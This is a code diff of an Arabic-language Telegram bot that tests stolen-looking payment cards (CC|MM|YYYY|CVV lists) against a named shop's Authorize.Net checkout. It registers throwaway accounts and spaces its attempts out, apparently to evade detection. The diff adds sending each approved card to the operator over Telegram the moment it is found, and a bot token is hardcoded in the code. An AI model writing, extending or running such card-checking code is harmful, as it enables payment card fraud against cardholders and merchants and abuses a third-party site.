@@ -40,6 +40,10 @@ BOT_TOKEN = "8375573526:AAFVj27YqwLI_na3YksvMcApJOopObTaIII"
 TEMP_DIR = "temp_files"
 os.makedirs(TEMP_DIR, exist_ok=True)
 
+# متغير عام لتخزين chat_id للمستخدم الحالي
+current_chat_id = None
+current_bot = None
+
 # ==================== الكود الأصلي للأداة ====================
 
 BASE_URL = "https://morgannasalchemy.com"
@@ -147,24 +151,45 @@ class AuthorizeNetChecker:
         except Exception as e:
             return "ERROR", str(e)
 
-def worker_single_file():
+def send_approved_card(cc_line, msg, email):
+    """إرسال البطاقة الصالحة فوراً عبر التليجرام"""
+    global current_chat_id, current_bot
+    if current_chat_id and current_bot:
+        try:
+            message = f"✅ *بطاقة صالحة مكتشفة!*\n\n`{cc_line}`\n\n📧 الحساب: `{email}`\n📝 الحالة: {msg}"
+            current_bot.send_message(
+                chat_id=current_chat_id,
+                text=message,
+                parse_mode='Markdown'
+            )
+            print(f"{Fore.GREEN}[تم الإرسال فوراً] {cc_line}")
+        except Exception as e:
+            print(f"{Fore.RED}[خطأ في إرسال البطاقة] {str(e)}")
+
+def worker_single_file(chat_id, bot):
     """وظيفة المعالجة من ملف abood.txt - كل حساب 5 بطاقات مع انتظار 20 ثانية"""
+    global current_chat_id, current_bot
+    current_chat_id = chat_id
+    current_bot = bot
+    
     try:
         with open("abood.txt", "r", encoding='utf-8') as f:
             lines = [l.strip() for l in f.readlines() if l.strip()]
         
         if not lines:
             print(f"{Fore.RED}ملف abood.txt فارغ يا معلم!")
+            bot.send_message(chat_id=chat_id, text="❌ الملف فارغ!") 
             return False, "الملف فارغ"
             
         print(f"{Fore.CYAN}تم العثور على {len(lines)} بطاقة في ملف abood.txt")
+        bot.send_message(chat_id=chat_id, text=f"📊 تم العثور على {len(lines)} بطاقة، جاري بدء الفحص...")
         
         # تحديد عدد البطاقات لكل حساب (5 بطاقات)
         cards_per_account = 5
         num_accounts = (len(lines) + cards_per_account - 1) // cards_per_account
         
         print(f"{Fore.YELLOW}سيتم استخدام {num_accounts} حساب (كل حساب {cards_per_account} بطاقات)")
-        print(f"{Fore.RED}⚠️ سيتم الانتظار 20 ثانية بين كل بطاقة والأخرى!")
+        bot.send_message(chat_id=chat_id, text=f"🔄 سيتم استخدام {num_accounts} حساب (كل حساب {cards_per_account} بطاقات)")
         
         approved_count = 0
         
@@ -175,7 +200,9 @@ def worker_single_file():
             
             print(f"\n{Fore.MAGENTA}{'='*60}")
             print(f"{Fore.YELLOW}🔄 إنشاء حساب رقم {account_num + 1}/{num_accounts}")
-            print(f"{Fore.MAGENTA}{'='*60}")
+            
+            # إرسال تحديث للمستخدم
+            bot.send_message(chat_id=chat_id, text=f"🔄 جاري إنشاء حساب رقم {account_num + 1}/{num_accounts}...")
             
             # إنشاء حساب جديد
             checker = AuthorizeNetChecker()
@@ -183,6 +210,7 @@ def worker_single_file():
             
             if not success:
                 print(f"{Fore.RED}❌ فشل تسجيل الحساب {account_num + 1}: {err}")
+                bot.send_message(chat_id=chat_id, text=f"❌ فشل تسجيل حساب {account_num + 1}: {err}")
                 # حفظ البطاقات في error
                 for cc_line in account_cards:
                     with file_lock:
@@ -190,9 +218,11 @@ def worker_single_file():
                             f.write(f"{cc_line} - فشل إنشاء الحساب\n")
                 continue
             
+            print(f"{Fore.GREEN}✅ تم تسجيل الحساب: {checker.current_email}")
+            bot.send_message(chat_id=chat_id, text=f"✅ تم تسجيل حساب {account_num + 1}: `{checker.current_email}`", parse_mode='Markdown')
+            
             # فحص البطاقات بهذا الحساب
-            print(f"{Fore.CYAN}📌 الحساب {checker.current_email} يفحص {len(account_cards)} بطاقات")
-            print(f"{Fore.YELLOW}⏱️ سيتم الانتظار 20 ثانية بين كل بطاقة...")
+            print(f"{Fore.CYAN}📌 الحساب يفحص {len(account_cards)} بطاقات")
             
             for i, cc_line in enumerate(account_cards, 1):
                 start_time = time.time()
@@ -209,6 +239,10 @@ def worker_single_file():
                         with open("APPROVED.txt", "a", encoding="utf-8") as f: 
                             f.write(f"{cc_line} - {msg} - الحساب: {checker.current_email}\n")
                         approved_count += 1
+                        
+                        # إرسال البطاقة الصالحة فوراً
+                        send_approved_card(cc_line, msg, checker.current_email)
+                        
                     elif status == "DECLINED":
                         print(f"{Fore.RED}[❌ DECLINED] {cc_line} - {msg}")
                         with open("declined.txt", "a", encoding="utf-8") as f: 
@@ -238,7 +272,10 @@ def worker_single_file():
                         f.write(f"بطاقة {i}: {cc_line}\n")
                     f.write("="*50 + "\n")
             
-            print(f"{Fore.GREEN}✅ الحساب {account_num + 1} اكتمل. جاري الانتقال للحساب التالي...")
+            print(f"{Fore.GREEN}✅ الحساب {account_num + 1} اكتمل.")
+            
+            # إرسال تحديث للمستخدم
+            bot.send_message(chat_id=chat_id, text=f"✅ اكتمل حساب {account_num + 1}/{num_accounts}")
             
             # انتظار 10 ثواني قبل الحساب الجديد
             if account_num < num_accounts - 1:
@@ -246,16 +283,38 @@ def worker_single_file():
                 time.sleep(10)
         
         print(f"\n{Fore.GREEN}{'='*60}")
-        print(f"{Fore.GREEN}🎉 تم الانتهاء من فحص جميع البطاقات باستخدام {num_accounts} حسابات!")
-        print(f"{Fore.GREEN}{'='*60}")
+        print(f"{Fore.GREEN}🎉 تم الانتهاء من فحص جميع البطاقات!")
+        
+        # إرسال إحصائيات سريعة
+        stats = f"📊 *إحصائيات الفحص النهائية:*\n\n✅ بطاقات صالحة: {approved_count}"
+        
+        if os.path.exists("declined.txt"):
+            with open("declined.txt", "r", encoding='utf-8') as f:
+                declined_count = sum(1 for line in f if line.strip())
+            stats += f"\n❌ مرفوضة: {declined_count}"
+        
+        if os.path.exists("error.txt"):
+            with open("error.txt", "r", encoding='utf-8') as f:
+                error_count = sum(1 for line in f if line.strip())
+            stats += f"\n⚠️ أخطاء: {error_count}"
+        
+        bot.send_message(chat_id=chat_id, text=stats, parse_mode='Markdown')
+        bot.send_message(chat_id=chat_id, text="✅ *تم الانتهاء من الفحص بالكامل!*", parse_mode='Markdown')
+        
+        # إرسال ملف APPROVED.txt كامل في النهاية
+        if os.path.exists("APPROVED.txt") and os.path.getsize("APPROVED.txt") > 0:
+            with open("APPROVED.txt", "rb") as f:
+                bot.send_document(chat_id=chat_id, document=f, filename="APPROVED.txt")
         
         return True, approved_count
         
     except FileNotFoundError:
         print(f"{Fore.RED}ملف abood.txt مش موجود!")
+        bot.send_message(chat_id=chat_id, text="❌ ملف abood.txt غير موجود!")
         return False, "الملف غير موجود"
     except Exception as e:
         print(f"{Fore.RED}حصل خطأ: {str(e)}")
+        bot.send_message(chat_id=chat_id, text=f"❌ حدث خطأ: {str(e)}")
         return False, str(e)
 
 # ==================== دوال البوت ====================
@@ -265,18 +324,21 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     welcome_msg = (
         "🤖 *مرحباً بك في بوت فحص البطاقات*\n\n"
         "📁 أرسل لي ملف `abood.txt` الذي يحتوي على البطاقات المراد فحصها\n\n"
-        "⚙️ *ملاحظات:*\n"
-        "• الملف يجب أن يكون بصيغة `.txt`\n"
-        "• كل بطاقة في سطر منفصل بصيغة: `CC|MM|YYYY|CVV`\n"
-        "• سيتم فحص البطاقات باستخدام 5 بطاقات لكل حساب\n"
-        "• بعد الانتهاء، سأرسل لك البطاقات الصالحة فقط (APPROVED)\n"
-        "• قد تستغرق العملية وقتاً حسب حجم الملف"
+        "⚙️ *مميزات البوت:*\n"
+        "• ✅ إرسال البطاقات الصالحة *فوراً* عند اكتشافها\n"
+        "• 📊 إحصائيات كاملة في نهاية الفحص\n"
+        "• 🔄 فحص 5 بطاقات لكل حساب\n"
+        "• ⏱️ انتظار 20 ثانية بين كل بطاقة\n\n"
+        "*صيغة البطاقات:*\n"
+        "`CC|MM|YYYY|CVV`\n"
+        "مثال: `4111111111111111|12|2025|123`"
     )
     await update.message.reply_text(welcome_msg, parse_mode='Markdown')
 
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """استقبال الملف ومعالجته"""
     user_id = update.effective_user.id
+    chat_id = update.effective_chat.id
     
     # إرسال رسالة تأكيد استلام الملف
     await update.message.reply_text("📥 جاري استلام الملف...")
@@ -302,105 +364,16 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # نسخ الملف إلى abood.txt في المجلد الحالي
         shutil.copy2(temp_file_path, "abood.txt")
         
-        await update.message.reply_text("✅ تم استلام الملف بنجاح!\n🔄 جاري بدء الفحص...")
+        await update.message.reply_text("✅ تم استلام الملف بنجاح!\n🔄 جاري بدء الفحص...\n📨 *سيتم إرسال البطاقات الصالحة فور اكتشافها*", parse_mode='Markdown')
         
         # بدء عملية الفحص في ثريد منفصل
         threading.Thread(
-            target=run_checker,
-            args=(user_id, update.effective_chat.id, context.application.bot)
+            target=worker_single_file,
+            args=(chat_id, context.application.bot)
         ).start()
         
     except Exception as e:
         await update.message.reply_text(f"❌ حدث خطأ أثناء استلام الملف: {str(e)}")
-
-def run_checker(user_id, chat_id, bot):
-    """تشغيل أداة الفحص في ثريد منفصل وإرسال النتائج"""
-    try:
-        # إرسال رسالة بدء الفحص
-        bot.send_message(
-            chat_id=chat_id,
-            text="🔍 *بدأت عملية الفحص...*\n⏱️ قد تستغرق وقتاً حسب عدد البطاقات",
-            parse_mode='Markdown'
-        )
-        
-        # تشغيل الفحص
-        success, result = worker_single_file()
-        
-        # قراءة النتائج (البطاقات الصالحة فقط)
-        approved_cards = []
-        if os.path.exists("APPROVED.txt"):
-            with open("APPROVED.txt", "r", encoding='utf-8') as f:
-                approved_cards = [line.strip() for line in f.readlines() if line.strip()]
-        
-        # إرسال النتائج
-        if approved_cards:
-            # تقسيم النتائج إذا كانت كبيرة
-            message = "✅ *البطاقات الصالحة (APPROVED):*\n\n"
-            
-            for i, card in enumerate(approved_cards, 1):
-                card_line = f"{i}. `{card}`\n"
-                
-                # إذا تجاوز الطول 4000 حرف، نرسل رسالة جديدة
-                if len(message + card_line) > 4000:
-                    bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
-                    message = f"{i}. `{card}`\n"
-                else:
-                    message += card_line
-            
-            # إرسال ما تبقى من الرسالة
-            if message:
-                bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
-            
-            # إرسال الملف أيضاً للاحتياط
-            if os.path.exists("APPROVED.txt"):
-                with open("APPROVED.txt", "rb") as f:
-                    bot.send_document(chat_id=chat_id, document=f, filename="APPROVED.txt")
-        else:
-            bot.send_message(
-                chat_id=chat_id,
-                text="❌ لم يتم العثور على بطاقات صالحة.\nراجع ملفات declined.txt و error.txt للتفاصيل.",
-                parse_mode='Markdown'
-            )
-        
-        # إرسال إحصائيات سريعة
-        stats = "📊 *إحصائيات الفحص:*\n\n"
-        
-        if os.path.exists("APPROVED.txt"):
-            with open("APPROVED.txt", "r", encoding='utf-8') as f:
-                approved_count = sum(1 for line in f if line.strip())
-            stats += f"✅ Approved: {approved_count}\n"
-        
-        if os.path.exists("declined.txt"):
-            with open("declined.txt", "r", encoding='utf-8') as f:
-                declined_count = sum(1 for line in f if line.strip())
-            stats += f"❌ Declined: {declined_count}\n"
-        
-        if os.path.exists("error.txt"):
-            with open("error.txt", "r", encoding='utf-8') as f:
-                error_count = sum(1 for line in f if line.strip())
-            stats += f"⚠️ Errors: {error_count}\n"
-        
-        bot.send_message(chat_id=chat_id, text=stats, parse_mode='Markdown')
-        
-        bot.send_message(
-            chat_id=chat_id,
-            text="✅ *تم الانتهاء من الفحص!*\nيمكنك إرسال ملف جديد لفحص بطاقات أخرى.",
-            parse_mode='Markdown'
-        )
-        
-    except Exception as e:
-        bot.send_message(
-            chat_id=chat_id,
-            text=f"❌ *حدث خطأ أثناء الفحص:*\n`{str(e)}`",
-            parse_mode='Markdown'
-        )
-    finally:
-        # تنظيف الملفات المؤقتة
-        try:
-            for temp_file in Path(TEMP_DIR).glob(f"abood_{user_id}_*.txt"):
-                temp_file.unlink()
-        except:
-            pass
 
 async def cleanup_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """أمر لتنظيف الملفات"""
@@ -439,7 +412,7 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "*طريقة الاستخدام:*\n"
         "1️⃣ أرسل ملف abood.txt\n"
         "2️⃣ انتظر حتى ينتهي الفحص\n"
-        "3️⃣ استلم البطاقات الصالحة\n\n"
+        "3️⃣ سيتم إرسال البطاقات الصالحة *فوراً* عند اكتشافها\n\n"
         "*صيغة البطاقات:*\n"
         "`CC|MM|YYYY|CVV`\n"
         "مثال: `4111111111111111|12|2025|123`"
